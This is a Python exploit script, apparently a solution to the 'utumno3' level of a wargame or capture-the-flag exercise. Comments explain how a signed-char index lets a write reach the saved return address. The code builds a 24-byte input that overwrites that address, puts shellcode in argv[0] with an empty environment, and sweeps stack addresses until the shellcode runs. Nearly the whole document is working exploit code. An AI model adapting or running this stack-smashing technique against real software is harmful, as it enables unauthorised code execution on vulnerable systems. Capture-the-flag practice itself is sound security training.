import ctypes, os, struct, sys, time

# ---------------------------------------------------------------------------
# utumno3's loop, written out as C:
#     int value = 0, k = 0;
#     do {
#         table[k] = (char)value;            /* table at ebp-0x20 */
#         table[k] ^= 3*k;
#         value = getchar();
#         table[(signed char)table[k]] = value;   /* <-- the write */
#         k++;
#         value = getchar();
#     } while (value != EOF && k <= 23);
#
# Two properties make this exploitable:
#   * the index is a SIGNED char, so it reaches table-128 .. table+127, which
#     covers the saved return address at table+40 (ebp+4);
#   * ASLR is off and the stack is executable, so the return address can point
#     at shellcode that lives in argv[0] -- the string execve gives the program.
#
# The first iteration is special: `value` starts at 0, so the selector byte is
# 0 and it consumes two input bytes like every other iteration.  Every
# iteration therefore consumes exactly two bytes: [index ^ 3k, value].
# ---------------------------------------------------------------------------
libc = ctypes.CDLL("libc.so.6", use_errno=True)
libc.execve.argtypes = [ctypes.c_char_p,
                        ctypes.POINTER(ctypes.c_char_p),
                        ctypes.POINTER(ctypes.c_char_p)]

sc = open("/tmp/uu3/sc.bin", "rb").read()
print("shellcode: %d bytes, NUL: %s" % (len(sc), b"\x00" in sc), flush=True)

def payload(addr):
    """24-byte input: iteration 0 writes a harmless byte to table[0];
    iterations 1..4 write the four return-address bytes to table[36..39]."""
    inp = bytearray([0 ^ 0, 0x90])          # k=0: selector 0, value 0x90
    k = 1
    for i in range(4):
        inp += bytes([(36 + i) ^ (3 * k % 256), (addr >> (8 * i)) & 0xff])
        k += 1
    return bytes(inp)

def run(addr):
    argv = (ctypes.c_char_p * 2)(sc, None)   # argv[0] IS the shellcode
    env = (ctypes.c_char_p * 1)(None)        # empty environment: fixed stack
    r, w = os.pipe()
    pid = os.fork()
    if pid == 0:
        os.close(r)
        os.dup2(w, 1); os.dup2(w, 2); os.close(w)
        fd = os.open("/tmp/uu3/inp", os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o644)
        os.write(fd, payload(addr)); os.close(fd)
        f = os.open("/tmp/uu3/inp", os.O_RDONLY); os.dup2(f, 0)
        libc.execve(b"/utumno/utumno3",
                    ctypes.cast(argv, ctypes.POINTER(ctypes.c_char_p)),
                    ctypes.cast(env, ctypes.POINTER(ctypes.c_char_p)))
        os._exit(1)
    os.close(w)
    out = b""
    end = time.time() + 0.3
    while time.time() < end:
        try:
            chunk = os.read(r, 4096)
        except OSError:
            break
        if not chunk:
            break
        out += chunk
    os.close(r)
    os.waitpid(pid, 0)
    return out

print("sweeping return addresses 0xffffd000..0xffffe000", flush=True)
found = None
for addr in range(0xffffd000, 0xffffe000, 4):
    if 0 in struct.pack("<I", addr):       # argv[0] is a C string
        continue
    out = run(addr)
    if b"PWN" in out:
        found = addr
        print("HIT at %#x" % addr, flush=True)
        print(out.decode("latin-1"), flush=True)
        break
if found is None:
    print("no address landed on the shellcode")
    sys.exit(1)
